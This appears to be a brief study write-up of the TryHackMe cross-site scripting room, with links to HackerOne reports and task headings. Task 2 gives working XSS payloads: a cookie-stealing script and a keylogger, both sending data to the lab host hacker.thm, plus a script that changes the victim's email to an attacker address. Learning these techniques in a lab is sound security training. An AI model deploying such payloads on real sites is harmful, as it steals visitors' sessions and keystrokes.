[TryHackMe | Cross-site Scripting](https://tryhackme.com/room/xssgi)

# TryHackMe-Cross-site-Scripting
`Cross-site Scripting - Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor's browsers.`

## Task 1 Room Brief
[Shopify disclosed on HackerOne: Stored xss](https://hackerone.com/reports/415484)

[Valve disclosed on HackerOne: XSS in steam react chat client](https://hackerone.com/reports/409850)

[HackerOne disclosed on HackerOne: IE only: stored Cross-Site...](https://hackerone.com/reports/449351)

[Infogram disclosed on HackerOne: Multiple xss on infogram templates](https://hackerone.com/reports/283825)

## Task 2 XSS Payloads
**Proof Of Concept:**
`<script>alert('XSS');</script>`

**Session Stealing:**
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

**Key Logger:**
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**
`<script>user.changeEmail('attacker@hacker.thm');</script>`

## Task 3 Reflected XSS
![image](https://user-images.githubusercontent.com/58542375/175781513-4585dbaf-2d21-4dbe-a9d2-470f0a1d6427.png)

## Task 4 Stored XSS
![image](https://user-images.githubusercontent.com/58542375/175781652-9bdf6957-5494-4967-afac-e92f20929ce6.png)

## Task 5 DOM Based XSS
![image](https://user-images.githubusercontent.com/58542375/175781988-434cd907-79b7-4fb7-89e8-6dd4edcd35ae.png)

[What is the Document Object Model?](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html)

## Task 6 Blind XSS
[XSS Hunter](https://xsshunter.com/)

## Task 7 Perfecting your payload

## Task 8 Practical Example (Blind XSS)
